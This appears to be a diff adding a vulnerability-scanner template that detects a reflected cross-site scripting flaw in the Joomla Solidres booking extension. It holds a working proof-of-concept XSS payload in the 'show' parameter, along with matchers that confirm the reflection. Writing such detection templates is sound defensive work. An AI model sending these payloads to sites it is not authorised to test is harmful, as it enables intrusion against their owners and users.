@@ -1,0 +1,27 @@
+id: joomla-solidres-xss
+name: Joomla Solidres 2.13.3 - Cross-Site Scripting
+severity: medium
+confidence: confirmed
+description: Joomla extension for Solidres - Online Booking System & Reservation Software is vulnerable to XSS in GET parameter
+  'show'.
+reference: https://www.exploit-db.com/exploits/51638
+tags:
+- xss
+- joomla
+- unauth
+- vuln
+requests:
+- method: GET
+  path: /joomla/greenery_hub/index.php/en/hotels/reservations?location=d2tff&task=hub.search&ordering=score&direction=desc&type_id=0&show=db8ck%22onfocus=%22confirm(document.domain)%22autofocus=%22xwu0k
+  matchers:
+  - type: body
+    words:
+    - onfocus="confirm(document.domain)"autofocus
+    - com_solidres
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
